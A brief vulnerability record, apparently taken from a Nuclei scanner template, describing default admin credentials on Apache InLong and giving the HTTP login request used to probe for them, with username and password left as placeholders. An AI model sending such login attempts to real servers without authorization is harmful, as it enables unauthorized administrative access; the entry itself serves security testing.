# Vulnerability: Apache InLong - Default Login
**Classification:** APACHE
**Source:** Nuclei Template (`apache-inlong-default-login.yaml`)

## Description
Apache InLong server enables default admin credentials. An attacker can execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /inlong/manager/api/anno/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"username":"{{username}}","password":"{{password}}"}
```

